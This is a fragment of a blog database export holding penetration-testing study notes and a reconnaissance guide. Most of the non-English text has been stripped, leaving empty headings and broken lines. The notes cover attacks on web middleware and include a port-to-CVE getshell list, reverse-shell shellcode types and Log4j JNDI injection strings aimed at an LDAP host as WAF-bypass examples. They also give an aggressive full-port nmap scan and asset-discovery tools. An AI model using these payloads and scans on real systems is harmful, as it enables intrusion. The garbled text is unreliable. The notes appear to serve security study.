class=\"headerlink\" title=\"iis\"></a>iis</h5><p></p>\n<p></p>\n<p></p>\n<p>iis</p>\n<p>PUT</p>\n<p><a class=\"link\"   href=\"https://blog.csdn.net/weixin_42918771/article/details/105178309\" >https://blog.csdn.net/weixin_42918771/article/details/105178309<i class=\"fas fa-external-link-alt\"></i></a></p>\n<h5 id=\"apache\"><a href=\"#apache\" class=\"headerlink\" title=\"apache\"></a>apache</h5><p>http</p>\n<p></p>\n<p><a class=\"link\"   href=\"https://blog.csdn.net/weixin_44268918/article/details/129129214\" >https://blog.csdn.net/weixin_44268918/article/details/129129214<i class=\"fas fa-external-link-alt\"></i></a></p>\n<p><strong>Fastbin</strong></p>\n<p>pwn</p>\n<p><a class=\"link\"   href=\"https://www.freebuf.com/articles/web/263598.html\" >https://www.freebuf.com/articles/web/263598.html<i class=\"fas fa-external-link-alt\"></i></a></p>\n<h3 id=\"12-Cobalt-strike-mimikatz\"><a href=\"#12-Cobalt-strike-mimikatz\" class=\"headerlink\" title=\"12.Cobalt strike,mimikatz\"></a>12.Cobalt strike,mimikatz</h3><p></p>\n<p><a class=\"link\"   href=\"https://www.freebuf.com/articles/network/290134.html\" >https://www.freebuf.com/articles/network/290134.html<i class=\"fas fa-external-link-alt\"></i></a></p>\n<h3 id=\"13-\"><a href=\"#13-\" class=\"headerlink\" title=\"13.\"></a>13.</h3><h5 id=\"Jboss\"><a href=\"#Jboss\" class=\"headerlink\" title=\"Jboss\"></a>Jboss</h5><ul>\n<li><strong></strong></li>\n<li><strong></strong></li>\n</ul>\n<p><a class=\"link\"   href=\"https://blog.csdn.net/m0_58434634/article/details/117434173\" >https://blog.csdn.net/m0_58434634/article/details/117434173<i class=\"fas fa-external-link-alt\"></i></a></p>\n<h5 id=\"weblogic\"><a href=\"#weblogic\" class=\"headerlink\" title=\"weblogic\"></a>weblogic</h5><ul>\n<li></li>\n<li></li>\n<li>XML Decoder</li>\n<li>webligic-SSRF</li>\n<li>java</li>\n</ul>\n<p><a class=\"link\"   href=\"https://www.cnblogs.com/-mo-/p/11503707.html\" >https://www.cnblogs.com/-mo-/p/11503707.html<i class=\"fas fa-external-link-alt\"></i></a></p>\n<h5 id=\"thinkphp\"><a href=\"#thinkphp\" class=\"headerlink\" title=\"thinkphp\"></a>thinkphp</h5><ul>\n<li></li>\n</ul>\n<p><a class=\"link\"   href=\"https://www.cnblogs.com/lingzhisec/p/15728886.html\" >https://www.cnblogs.com/lingzhisec/p/15728886.html<i class=\"fas fa-external-link-alt\"></i></a></p>\n<h5 id=\"Struts2\"><a href=\"#Struts2\" class=\"headerlink\" title=\"Struts2\"></a>Struts2</h5><p><a class=\"link\"   href=\"https://blog.csdn.net/HBohan/article/details/122667891\" >https://blog.csdn.net/HBohan/article/details/122667891<i class=\"fas fa-external-link-alt\"></i></a></p>\n<h5 id=\"Shiro\"><a href=\"#Shiro\" class=\"headerlink\" title=\"Shiro\"></a>Shiro</h5><ul>\n<li></li>\n</ul>\n<p><a class=\"link\"   href=\"https://www.freebuf.com/vuls/283810.html\" >https://www.freebuf.com/vuls/283810.html<i class=\"fas fa-external-link-alt\"></i></a></p>\n<h3 id=\"14-\"><a href=\"#14-\" class=\"headerlink\" title=\"14.\"></a>14.</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">20FTP</span><br><span class=\"line\">21FTP  </span><br><span class=\"line\">22SSH </span><br><span class=\"line\">23Telnet </span><br><span class=\"line\">25SMTP POP3 110</span><br><span class=\"line\">43whois</span><br><span class=\"line\">53DNS(TCP/UDP 53)</span><br><span class=\"line\">67/68DHCP</span><br><span class=\"line\">69TFTP</span><br><span class=\"line\">80HTTPweb</span><br><span class=\"line\">88Kerberos</span><br><span class=\"line\">110POP3SMTP25</span><br><span class=\"line\">135RPC</span><br><span class=\"line\">137/138 NMB</span><br><span class=\"line\">139SMB/CIFS</span><br><span class=\"line\">143IMAP</span><br><span class=\"line\">161/162: Snmppublic</span><br><span class=\"line\">389LDAP</span><br><span class=\"line\">443HTTPSSSL</span><br><span class=\"line\">445SMBMS17-010</span><br><span class=\"line\">512/513/514Linux Rexec</span><br><span class=\"line\">636LDAPS</span><br><span class=\"line\">873Rsync Rsyncrsync </span><br><span class=\"line\">1080socket</span><br><span class=\"line\">1099RMI RMI</span><br><span class=\"line\">1352Lotus domino</span><br><span class=\"line\">1414IBM WebSphere MQ</span><br><span class=\"line\">1433SQL Server</span><br><span class=\"line\">1434SQL ServerTCP/IP</span><br><span class=\"line\">1521oracle</span><br><span class=\"line\">2049NFSNFS</span><br><span class=\"line\">2181ZooKeeper ZooKeeper</span><br><span class=\"line\">2375Docker Docker</span><br><span class=\"line\">2601:   Zebra zebr</span><br><span class=\"line\">3128:   squid )</span><br><span class=\"line\">3268LDAP</span><br><span class=\"line\">3306MySQL </span><br><span class=\"line\">3389Windows   CVE-2019-0708 </span><br><span class=\"line\">3690SVNSVN</span><br><span class=\"line\">4440Rundeckadmin</span><br><span class=\"line\">4560log4j SocketServer log4j&lt;=1.2.17CVE-2019-17571</span><br><span class=\"line\">4750BMC BMCRSCD(CVE-2016-1542)</span><br><span class=\"line\">4848GlassFishadmin/adminadmin</span><br><span class=\"line\">5000SysBase/DB2</span><br><span class=\"line\">5432PostGreSQL</span><br><span class=\"line\">5632PyAnywhere</span><br><span class=\"line\">5900/5901VNC VNC</span><br><span class=\"line\">5984CouchDB CouchDB</span><br><span class=\"line\">6379RedisRedisRedis</span><br><span class=\"line\">7001/7002WeblogicWeblogicWeblogic</span><br><span class=\"line\">7180Cloudera manager</span><br><span class=\"line\">8000JDWPJDWP</span><br><span class=\"line\">8069ZabbixZabbixGetshell</span><br><span class=\"line\">8080TomcatJBossTomcatGetshellJBossTomcatGetshell</span><br><span class=\"line\">8080-8090web</span><br><span class=\"line\">8089JettyJenkins</span><br><span class=\"line\">8161Apache ActiveMQadmin:admin CVE-2016-3088Apache ActiveMQCVE-2016-3088</span><br><span class=\"line\">9000fastcgi</span><br><span class=\"line\">9001SupervisordSupervisord(CVE-2017-11610)Supervisord(CVE-2017-11610)</span><br><span class=\"line\">9043/9090WebSphereWebSphere</span><br><span class=\"line\">9200/9300Elasticsearch Elasticsearch</span><br><span class=\"line\">10000Webmin-Web</span><br><span class=\"line\">10001/10002JmxRemoteLifecycleListenerTomcatTomcat(CVE-2016-8735)</span><br><span class=\"line\">11211Memcached Memcached</span><br><span class=\"line\">27017/27018MongoDB MongoDB</span><br><span class=\"line\">50000SAP Management Console </span><br><span class=\"line\">50070Hadoop Hadoop</span><br><span class=\"line\">61616Apache ActiveMQ Apache ActiveMQCVE-2016-3088</span><br><span class=\"line\">60020hbase.regionserver.portHRegionServerRPC</span><br><span class=\"line\">60030hbase.regionserver.info.portHRegionServerhttp</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n\n\n\n\n<h3 id=\"15-\"><a href=\"#15-\" class=\"headerlink\" title=\"15.\"></a>15.</h3><h5 id=\"Log4j2\"><a href=\"#Log4j2\" class=\"headerlink\" title=\"Log4j2\"></a>Log4j2</h5><p><a class=\"link\"   href=\"https://juejin.cn/post/7202514143341002789\" >https://juejin.cn/post/7202514143341002789<i class=\"fas fa-external-link-alt\"></i></a></p>\n<h5 id=\"spring-core-rce-2022-03-29\"><a href=\"#spring-core-rce-2022-03-29\" class=\"headerlink\" title=\"spring-core-rce-2022-03-29\"></a>spring-core-rce-2022-03-29</h5><p><a class=\"link\"   href=\"https://blog.csdn.net/weixin_45632448/article/details/124190382\" >https://blog.csdn.net/weixin_45632448/article/details/124190382<i class=\"fas fa-external-link-alt\"></i></a></p>\n<h3 id=\"16-web\"><a href=\"#16-web\" class=\"headerlink\" title=\"16.web\"></a>16.web</h3><ul>\n<li></li>\n<li></li>\n<li></li>\n<li></li>\n</ul>\n<h3 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h3><h2 id=\"-1\"><a href=\"#-1\" class=\"headerlink\" title=\"\"></a></h2><hr>\n<h1 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h1><h3 id=\"1-top-chunk-house-of-force-\"><a href=\"#1-top-chunk-house-of-force-\" class=\"headerlink\" title=\"1.top chunk(house of force)\"></a>1.top chunk(house of force)</h3><ol>\n<li>Windows Meterpreter Reverse TCP shellcode shellcode  Metasploit  Meterpreter </li>\n<li>Windows Reverse TCP shellcode shellcode  Windows  shell </li>\n<li>Windows Reverse HTTP shellcode shellcode  Windows  HTTP </li>\n<li>Beacon Payload shellcode shellcode  Cobalt Strike  Beacon </li>\n<li>Linux Reverse TCP shellcode shellcode  Linux  shell </li>\n<li>Mac Reverse TCP shellcode shellcode  Mac  shell </li>\n</ol>\n<h3 id=\"2-6379-8009\"><a href=\"#2-6379-8009\" class=\"headerlink\" title=\"2.6379,8009\"></a>2.6379,8009</h3><ul>\n<li>6379redis</li>\n<li>8009<code>Apache-Tomcat-Ajp</code>tomcatajp8009</li>\n</ul>\n<h3 id=\"3-Cobalt-strike-shellcode\"><a href=\"#3-Cobalt-strike-shellcode\" class=\"headerlink\" title=\"3.Cobalt strike shellcode?\"></a>3.Cobalt strike shellcode?</h3><p></p>\n<h3 id=\"4-Apache-\"><a href=\"#4-Apache-\" class=\"headerlink\" title=\"4.Apache \"></a>4.Apache </h3><blockquote>\n<p>apacheapachetest.php.abcmime.typeswindowsapache</p>\n</blockquote>\n<p>phpinfo.phpphpinfo.php.abc</p>\n<h3 id=\"5-\"><a href=\"#5-\" class=\"headerlink\" title=\"5. \"></a>5. </h3><p><strong>iis</strong></p>\n<h3 id=\"6-xxe\"><a href=\"#6-xxe\" class=\"headerlink\" title=\"6.xxe\"></a>6.xxe</h3><p>php:&#x2F;&#x2F;filter</p>\n<h3 id=\"7-S2-052\"><a href=\"#7-S2-052\" class=\"headerlink\" title=\"7.S2_052\"></a>7.S2_052</h3><p><strong>JBoss &#x2F;jmx-console&#x2F;HtmlAdaptor </strong>JMX</p>\n<h3 id=\"8-Weblogic-\"><a href=\"#8-Weblogic-\" class=\"headerlink\" title=\"8.Weblogic \"></a>8.Weblogic </h3><ul>\n<li><strong>XMLDecoder</strong></li>\n<li><strong>T3</strong></li>\n<li><strong></strong></li>\n<li><strong></strong></li>\n<li><strong>IIOP</strong></li>\n<li><strong>SSRF</strong></li>\n</ul>\n<h3 id=\"9-Jboss-\"><a href=\"#9-Jboss-\" class=\"headerlink\" title=\"9.Jboss \"></a>9.Jboss </h3><ul>\n<li><strong></strong></li>\n<li><strong></strong></li>\n</ul>\n<h3 id=\"10-Struts2-\"><a href=\"#10-Struts2-\" class=\"headerlink\" title=\"10.Struts2 \"></a>10.Struts2 </h3><ul>\n<li></li>\n</ul>\n<h3 id=\"11-Fastbin-\"><a href=\"#11-Fastbin-\" class=\"headerlink\" title=\"11.Fastbin \"></a>11.Fastbin </h3><p></p>\n<ol>\n<li> Fastbin </li>\n<li> glibc  Fastbin </li>\n<li> Fastbin </li>\n<li> glibc  Fastbin </li>\n</ol>\n<h3 id=\"12-Ssrf-\"><a href=\"#12-Ssrf-\" class=\"headerlink\" title=\"12.Ssrf \"></a>12.Ssrf </h3><p><strong><u></u></strong></p>\n<h3 id=\"13-ssrf-getpost\"><a href=\"#13-ssrf-getpost\" class=\"headerlink\" title=\"13.ssrf getpost\"></a>13.ssrf getpost</h3><p></p>\n<h3 id=\"14-Log4j-\"><a href=\"#14-Log4j-\" class=\"headerlink\" title=\"14.Log4j \"></a>14.Log4j </h3><ul>\n<li><p><strong>portwafip:port</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$&#123;jndi:ldap:192.168.1.1/a&#125;</span><br><span class=\"line\"> $&#123;jndi:ldap:192.168.1.1:/a&#125; </span><br><span class=\"line\">ldap389</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n\n</li>\n<li><p><strong>IP</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$&#123;jndi:ldap://[192.168.34.96]/a&#125; </span><br><span class=\"line\">$&#123;jndi:ldap://[192.168.34.96]]/a&#125; </span><br><span class=\"line\"> LdapURL&quot;[ip]&quot;LdapCtx[]ip389</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure></li>\n</ul>\n<h3 id=\"15-oggphp\"><a href=\"#15-oggphp\" class=\"headerlink\" title=\"15.oggphp\"></a>15.oggphp</h3><p>OGGPHPPHPPHPPHPfile:&#x2F;&#x2F;http:&#x2F;&#x2F;HTTP</p>\n<h3 id=\"16-Zip-php\"><a href=\"#16-Zip-php\" class=\"headerlink\" title=\"16. Zip:&#x2F;&#x2F;php\"></a>16. Zip:&#x2F;&#x2F;php</h3><p><code>zip://</code>  PHP 5.2.0  PHP  PHP  ZIP </p>\n<h3 id=\"17--asp\"><a href=\"#17--asp\" class=\"headerlink\" title=\"17..asp\"></a>17..asp</h3><h3 id=\"18-Nginx-apache\"><a href=\"#18-Nginx-apache\" class=\"headerlink\" title=\"18.Nginx,apache\"></a>18.Nginx,apache</h3><p></p>\n<h3 id=\"19-Dom-xssxss\"><a href=\"#19-Dom-xssxss\" class=\"headerlink\" title=\"19.Dom xssxss\"></a>19.Dom xssxss</h3><blockquote>\n<p>DOM  XSS  XSS  XSS  DOM  XSS  DOM </p>\n</blockquote>\n<h3 id=\"20-Ms17-010\"><a href=\"#20-Ms17-010\" class=\"headerlink\" title=\"20.Ms17_010\"></a>20.Ms17_010</h3><p>445</p>\n<h3 id=\"21-Sqlmap-user-agent\"><a href=\"#21-Sqlmap-user-agent\" class=\"headerlink\" title=\"21.Sqlmap user-agent\"></a>21.Sqlmap user-agent</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">--random-agent</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"22-Xp-cmdshell-\"><a href=\"#22-Xp-cmdshell-\" class=\"headerlink\" title=\"22.Xp_cmdshell \"></a>22.Xp_cmdshell </h3><p><code> Microsoft SQL Server </code></p>\n<h3 id=\"23-Symlink\"><a href=\"#23-Symlink\" class=\"headerlink\" title=\"23.Symlink\"></a>23.Symlink</h3><p></p>\n<h3 id=\"24-Samba-wannacry\"><a href=\"#24-Samba-wannacry\" class=\"headerlink\" title=\"24.Samba wannacry\"></a>24.Samba wannacry</h3><ul>\n<li> Samba Samba EternalBlue </li>\n<li> SMBv1 Samba  SMBv1  WannaCry  SMBv1  Windows  SMBv1 </li>\n<li> Windows  SMBv1 </li>\n<li> Samba  Samba </li>\n<li> Samba </li>\n</ul>\n"},{"title":"","date":"2023-06-19T12:13:33.000Z","excerpt":"","_content":"\n# \n\n### \n\n#### \n\n \n\n**=>=>=>=>=>=>**\n\n\n\n# \n\n### \n\n#### \n\n \n\n**=>=>=>=>=>=>**\n\n\n\n\n\n### \n\n#### \n\n\n\n- ****\n\n[https://beian.miit.gov.cn](https://beian.miit.gov.cn/#/Integrated/index)\n\n![-1687322327126](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404151436515.png)\n- ****\n\n  ****\n\n  \n\n  \n\n  **fofa**\n\n  \n\n![-1687322359802](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404151436630.png)\n\n\n\n#### \n\n**layer**\n\nOneForAllhttps://github.com/shmilylty/OneForAll\n\n\n\n\n\n> \n>\n> 1.\n>\n> 2.[SSL](https://www.sfn.cn/certificate.html)\n>\n> 3.IP\n>\n> 4.\n\n\n\n#### \n\n**** \n\n****nmapgoby\n\nnmap\n\n```\nnmap -sS -Pn -n --open --min-hostgroup 4 --min-parallelism 1024 --host-timeout 30 -T4 -v -p 1-65535 -iL ip.txt -oX output.xml \n```\n\n****\n\n- http://duankou.wlphp.com/\n- http://www.all-tool.cn/Tools/portblast/\n- MaToolshttps://www.matools.com/port\n\n\n\n#### \n\n    1CMSCMSCMSphpcmsecshop\n    \n    2HTML5jquerybootstrappureace\n    \n    3WebApachelighttpd, Nginx, IIS\n    \n    4TomcatJbossweblogicwebsphere\n    \n    5PHPJavaRubyPythonC#\n    \n    6linuxwin2k8win7kalicentos\n    \n    7CDNCDNcloudflare360cdn365cydyunjiasu\n    \n    8WAFwafTopsecJiasuleYundun\n    \n    9IPIP\n    \n    10\n\n\n\n\n\n> > ****\n> >\n> > https://www.yunsee.cn/\n> >\n> > ****\n> >\n> > http://whatweb.bugscaner.com/look/\n> >\n> > **fofa,goby**\n> >\n> > https://fofa.so/\n> >\n> > **wappalyzer**\n> >\n> > \n> >\n> > ****\n> >\n> > http://finger.tidesec.net/\n> >\n> > ****\n> >\n> > https://fp.shuziguanxing.com/#/\n> >\n> > ****\n> >\n> > https://mp.weixin.qq.com/s/lHIJmIWbm8ylK6yjjmmNkg\n\n\n\n\n\n#### \n\n\n\n **Fofa****Shodan****360 ******** ZoomEye** \n\n\n\n#### \n\n****dirsearchffuf\n\nffuf  FFUZ FFUZ Github  4k  star https://github.com/TheKingOfDuck/fuzzDicts\n\n\n\n#### \n\n\n\n Github \n\n+@\n\n\n\nhttps://www.skymem.info/\n\nhttps://app.snov.io/domain-search\n\nhttps://www.email-format.com/i/search/\n\n outlook \n\n()\n\n\n\n#### ip\n\ncdnip\n\n**cdn**\n\nCDN\n\n\n\nCDNPingIPCDN\nping\n\nhttps://asm.ca.com/en/ping.php\n\nhttps://ping.chinaz.com/\n\nhttp://www.webkaka.com/ping.aspx\n\n![-1687322375738](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404151437964.png)\n\n- \n\ncdnCDNIPhostCC80IP\n\n- nslookup\n\nhttp://tool.chinaz.com/nslookup\n\nDNSDNSCDNCDNIP\n\n\n\n- ping\n\nping example.com[www.example.comCDNwww.example.com](http://www.example.com,cdnwww.example.com/) cnameCDNping example.comIP\n\n\n\n#### c\n\nIP\n\n**C**\n\n```\nhttps://hunter.qianxin.com/\n \n FOFAhttps://fofa.info/toLogin\n \n 360https://quake.360.net/#/index\n \n https://www.yunsee.cn/\n```\n\n\n\n#### whois\n\n\n\n![-1687322388065](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404151437038.png)\n\n\n\n","source":"_posts/.md","raw":"---\ntitle: \ndate: 2023-06-19 20:13:33\nexcerpt: \ncategories: \n---\n\n# \n\n### \n\n#### \n\n \n\n**=>=>=>=>=>=>**\n\n\n\n# \n\n### \n\n#### \n\n \n\n**=>=>=>=>=>=>**\n\n\n\n\n\n### \n\n#### \n\n\n\n- ****\n\n[https://beian.miit.gov.cn](https://beian.miit.gov.cn/#/Integrated/index)\n\n![-1687322327126](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404151436515.png)\n- ****\n\n  ****\n\n  \n\n  \n\n  **fofa**\n\n  \n\n![-1687322359802](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404151436630.png)\n\n\n\n#### \n\n**layer**\n\nOneForAllhttps://github.com/shmilylty/OneForAll\n\n\n\n\n\n> \n>\n> 1.\n>\n> 2.[SSL](https://www.sfn.cn/certificate.html)\n>\n> 3.IP\n>\n> 4.\n\n\n\n#### \n\n**** \n\n****nmapgoby\n\nnmap\n\n```\nnmap -sS -Pn -n --open --min-hostgroup 4 --min-parallelism 1024 --host-timeout 30 -T4 -v -p 1-65535 -iL ip.txt -oX output.xml \n```\n\n****\n\n- http://duankou.wlphp.com/\n- http://www.all-tool.cn/Tools/portblast/\n- MaToolshttps://www.matools.com/port\n\n\n\n#### \n\n    1CMSCMSCMSphpcmsecshop\n    \n    2HTML5jquerybootstrappureace\n    \n    3WebApachelighttpd, Nginx, IIS\n    \n    4TomcatJbossweblogicwebsphere\n    \n    5PHPJavaRubyPythonC#\n    \n    6linuxwin2k8win7kalicentos\n    \n    7CDNCDNcloudflare360cdn365cydyunjiasu\n    \n    8WAFwafTopsecJiasuleYundun\n    \n    9IPIP\n    \n    10\n\n\n\n\n\n> > ****\n> >\n> > https://www.yunsee.cn/\n> >\n> > ****\n> >\n> > http://whatweb.bugscaner.com/look/\n> >\n> > **fofa,goby**\n> >\n> > https://fofa.so/\n> >\n> > **wappalyzer**\n> >\n> > \n> >\n> > ****\n> >\n> > http://finger.tidesec.net/\n> >\n> > ****\n> >\n> > https://fp.shuziguanxing.com/#/\n> >\n> > ****\n> >\n> > https://mp.weixin.qq.com/s/lHIJmIWbm8ylK6yjjmmNkg\n\n\n\n\n\n#### \n\n\n\n **Fofa****Shodan****360 ******** ZoomEye** \n\n\n\n#### \n\n****dirsearchffuf\n\nffuf  FFUZ FFUZ Github  4k  star https://github.com/TheKingOfDuck/fuzzDicts\n\n\n\n#### \n\n\n\n Github \n\n+@\n\n\n\nhttps://www.skymem.info/\n\nhttps://app.snov.io/domain-search\n\nhttps://www.email-format.com/i/search/\n\n outlook \n\n()\n\n\n\n#### ip\n\ncdnip\n\n**cdn**\n\nCDN\n\n\n\nCDNPingIPCDN\nping\n\nhttps://asm.ca.com/en/ping.php\n\nhttps://ping.chinaz.com/\n\nhttp://www.webkaka.com/ping.aspx\n\n![-1687322375738](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404151437964.png)\n\n- \n\ncdnCDNIPhostCC80IP\n\n- nslookup\n\nhttp://tool.chinaz.com/nslookup\n\nDNSDNSCDNCDNIP\n\n\n\n- ping\n\nping example.com[www.example.comCDNwww.example.com](http://www.example.com,cdnwww.example.com/) cnameCDNping example.comIP\n\n\n\n#### c\n\nIP\n\n**C**\n\n```\nhttps://hunter.qianxin.com/\n \n FOFAhttps://fofa.info/toLogin\n \n 360https://quake.360.net/#/index\n \n https://www.yunsee.cn/\n```\n\n\n\n#### whois\n\n\n\n![-1687322388065](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404151437038.png)\n\n\n\n","slug":"","published":1,"updated":"2024-04-17T08:42:59.614Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clv3kf7j8000ph776dk2na505","content":"<h1 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h1><h3 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h3><h4 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h4><p> </p>\n<p><strong>&#x3D;&gt;&#x3D;&gt;&#x3D;&gt;&#x3D;&gt;&#x3D;&gt;&#x3D;&gt;</strong></p>\n<p></p>\n<h1 id=\"-1\"><a href=\"#-1\" class=\"headerlink\" title=\"\"></a></h1><h3 id=\"-1\"><a href=\"#-1\" class=\"headerlink\" title=\"\"></a></h3><h4 id=\"-1\"><a href=\"#-1\" class=\"headerlink\" title=\"\"></a></h4><p> </p>\n<p><strong>&#x3D;&gt;&#x3D;&gt;&#x3D;&gt;&#x3D;&gt;&#x3D;&gt;&#x3D;&gt;</strong></p>\n<p></p>\n<h3 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h3><h4 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h4><p></p>\n<ul>\n<li><strong></strong></li>\n</ul>\n<p><a class=\"link\"   href=\"https://beian.miit.gov.cn/#/Integrated/index\" >https://beian.miit.gov.cn<i class=\"fas fa-external-link-alt\"></i></a></p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404151436515.png\"\n                        alt=\"-1687322327126\"\n                 ></p>\n<ul>\n<li><p><strong></strong></p>\n<p><strong></strong></p>\n<p></p>\n<p><strong>fofa</strong></p>\n<p></p>\n</li>\n</ul>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404151436630.png\"\n                        alt=\"-1687322359802\"\n                 ></p>\n<h4 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h4><p><strong>layer</strong></p>\n<p>OneForAll<a class=\"link\"   href=\"https://github.com/shmilylty/OneForAll\" >https://github.com/shmilylty/OneForAll<i class=\"fas fa-external-link-alt\"></i></a></p>\n<p></p>\n<blockquote>\n<p></p>\n<p>1.</p>\n<p>2.<a class=\"link\"   href=\"https://www.sfn.cn/certificate.html\" >SSL<i class=\"fas fa-external-link-alt\"></i></a></p>\n<p>3.IP</p>\n<p>4.</p>\n</blockquote>\n<h4 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h4><p><strong></strong> </p>\n<p><strong></strong>nmapgoby</p>\n<p>nmap</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nmap -sS -Pn -n --open --min-hostgroup 4 --min-parallelism 1024 --host-timeout 30 -T4 -v -p 1-65535 -iL ip.txt -oX output.xml </span><br></pre></td></tr></table></figure>\n\n<p><strong></strong></p>\n<ul>\n<li><a class=\"link\"   href=\"http://duankou.wlphp.com/\" >http://duankou.wlphp.com/<i class=\"fas fa-external-link-alt\"></i></a></li>\n<li><a class=\"link\"   href=\"http://www.all-tool.cn/Tools/portblast/\" >http://www.all-tool.cn/Tools/portblast/<i class=\"fas fa-external-link-alt\"></i></a></li>\n<li>MaTools<a class=\"link\"   href=\"https://www.matools.com/port\" >https://www.matools.com/port<i class=\"fas fa-external-link-alt\"></i></a></li>\n</ul>\n<h4 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h4><pre><code>1CMSCMSCMSphpcmsecshop\n\n2HTML5jquerybootstrappureace\n\n3WebApachelighttpd, Nginx, IIS\n\n4TomcatJbossweblogicwebsphere\n\n5PHPJavaRubyPythonC#\n\n6linuxwin2k8win7kalicentos\n\n7CDNCDNcloudflare360cdn365cydyunjiasu\n\n8WAFwafTopsecJiasuleYundun\n\n9IPIP\n\n10\n</code></pre>\n<p></p>\n<blockquote>\n<blockquote>\n<p><strong></strong></p>\n<p><a class=\"link\"   href=\"https://www.yunsee.cn/\" >https://www.yunsee.cn/<i class=\"fas fa-external-link-alt\"></i></a></p>\n<p><strong></strong></p>\n<p><a class=\"link\"   href=\"http://whatweb.bugscaner.com/look/\" >http://whatweb.bugscaner.com/look/<i class=\"fas fa-external-link-alt\"></i></a></p>\n<p><strong>fofa,goby</strong></p>\n<p><a class=\"link\"   href=\"https://fofa.so/\" >https://fofa.so/<i class=\"fas fa-external-link-alt\"></i></a></p>\n<p><strong>wappalyzer</strong></p>\n<p></p>\n<p><strong></strong></p>\n<p><a class=\"link\"   href=\"http://finger.tidesec.net/\" >http://finger.tidesec.net/<i class=\"fas fa-external-link-alt\"></i></a></p>\n<p><strong></strong></p>\n<p><a class=\"link\"   href=\"https://fp.shuziguanxing.com/#/\" >https://fp.shuziguanxing.com/#/<i class=\"fas fa-external-link-alt\"></i></a></p>\n<p><strong></strong></p>\n<p><a class=\"link\"   href=\"https://mp.weixin.qq.com/s/lHIJmIWbm8ylK6yjjmmNkg\" >https://mp.weixin.qq.com/s/lHIJmIWbm8ylK6yjjmmNkg<i class=\"fas fa-external-link-alt\"></i></a></p>\n</blockquote>\n</blockquote>\n<p></p>\n<h4 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h4><p></p>\n<p> <strong>Fofa</strong><strong>Shodan</strong><strong>360 </strong><strong></strong><strong> ZoomEye</strong> </p>\n<h4 id=\"\"><a href=\"#\" class=\"headerlink\" 